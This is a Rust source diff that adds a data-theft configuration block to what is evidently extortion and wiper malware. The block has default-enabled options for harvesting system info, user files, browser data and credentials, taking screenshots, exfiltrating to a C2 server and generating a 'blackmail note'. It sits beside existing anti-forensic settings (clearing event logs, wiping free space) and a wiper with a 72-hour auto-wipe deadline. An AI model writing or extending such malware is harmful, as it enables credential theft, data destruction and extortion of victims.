@@ -63,6 +63,20 @@ pub struct AntiForensicConfig {
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct DataTheftConfig {
+    pub enabled: bool,
+    pub collect_system_info: bool,
+    pub collect_user_files: bool,
+    pub collect_browser_data: bool,
+    pub collect_credentials: bool,
+    pub capture_screenshots: bool,
+    pub max_files_to_collect: usize,
+    pub max_file_preview_size: usize,
+    pub exfiltrate_to_c2: bool,
+    pub generate_blackmail_note: bool,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct WiperConfig {
     pub deadline_hours: u32,
     pub auto_wipe_on_deadline: bool,
@@ -108,6 +122,7 @@ pub struct Config {
     pub communication: CommunicationConfig,
     pub persistence: PersistenceConfig,
     pub anti_forensic: AntiForensicConfig,
+    pub data_theft: DataTheftConfig,
     pub wiper: WiperConfig,
     pub web_interface: WebInterfaceConfig,
     pub logging: LoggingConfig,
@@ -163,6 +178,18 @@ impl Default for Config {
                 wipe_free_space: true,
                 clear_event_logs: true,
                 capture_screenshot: true,
+            },
+            data_theft: DataTheftConfig {
+                enabled: true,
+                collect_system_info: true,
+                collect_user_files: true,
+                collect_browser_data: true,
+                collect_credentials: true,
+                capture_screenshots: true,
+                max_files_to_collect: 100,
+                max_file_preview_size: 1024,
+                exfiltrate_to_c2: false,
+                generate_blackmail_note: true,
             },
             wiper: WiperConfig {
                 deadline_hours: 72,
